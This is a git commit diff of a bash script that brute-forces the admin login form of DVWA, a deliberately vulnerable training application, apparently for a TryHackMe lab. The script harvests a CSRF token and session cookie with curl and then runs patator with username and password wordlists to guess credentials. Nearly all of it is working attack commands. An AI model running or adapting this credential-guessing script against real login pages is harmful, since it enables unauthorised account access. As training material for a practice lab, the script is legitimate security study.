5bc3d7ec1c4d8ee980dcd6f340998dd143e7b36a
rfrost777 <tberrang@t-online.de>
2023-07-21 19:17:03 +0200

    Add debug output, improve script quality, fix patator arguments.
    Signed-off-by: rfrost777 <tberrang@t-online.de>

--- dvwa_patator.sh
+++ dvwa_patator.sh
@@ -1,17 +1,30 @@
 #!/bin/bash
-# SETUP: Change this to your targets IP
-TARGET_URL="10.10.215.78"
+# Bruteforce the Admin login HTTP FORM of the DVWA 1.10+
+# with security set to "impossible"
+# using patator 0.9+ (https://github.com/lanjelot/patator)...
+#
+# Enhanced and fixed the version provided by TryHackMe, wich sadly,
+# did not work for me AT ALL (https://tryhackme.com/room/bruteforceheroes).
 
-CSRF=$(curl -s -c dvwa.cookie "192.168.1.44/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
-SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
+# SETUP: Change this to your target URL _without_ trailing slash, path to user and passwordlists...
+TARGET_URL="http://10.10.78.87"
+USER_LIST="/usr/share/seclists/usernames.txt"
+PASS_LIST="/usr/share/wordlists/1500-worst-passwords.txt"
 
-#hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/500-worst-passwords.txt \
-#  -e ns  -F  -u  -t 1  -w 10  -V  192.168.1.44  http-post-form \
-#  "/DVWA/login.php:username=^USER^&password=^PASS^&user_token=${CSRF}&Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}"
+# Use curl to get a cookie, save it and extract the PHP Session ID:
+CSRF_TOKEN=$(curl -s -c dvwa.cookie "${TARGET_URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
+SESSION_ID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
 
-patator  http_fuzz  method=POST  follow=0  accept_cookie=0 --threads=1  timeout=10 \
-  url="http://192.168.1.44/DVWA/login.php" \
-  1=/usr/share/seclists/Usernames/top_shortlist.txt  0=/usr/share/seclists/Passwords/500-worst-passwords.txt \
-  body="username=FILE1&password=FILE0&user_token=${CSRF}&Login=Login" \
-  header="Cookie: security=impossible; PHPSESSID=${SESSIONID}" \
-  -x quit:fgrep=index.php
+echo -e "\nHarvested CSRF Token: $(tput setaf 3)${CSRF_TOKEN}$(tput sgr0)"
+echo -e "PHP Session ID: $(tput setaf 3)${SESSION_ID}$(tput sgr0)\n\n"
+
+patator  http_fuzz  method=POST  follow=0  accept_cookie=0 --threads=5  timeout=10 \
+  url="${TARGET_URL}/login.php" \
+  0=${USER_LIST}  1=${PASS_LIST} \
+  body="username=FILE0&password=FILE1&user_token=${CSRF_TOKEN}&Login=Login" \
+  header="Cookie: security=impossible; PHPSESSID=${SESSION_ID}" \
+  -x quit:fgrep=index.php \
+  -x ignore:fgrep=login.php
+
+# Clean up the cookie:
+rm -f ./dvwa.cookie
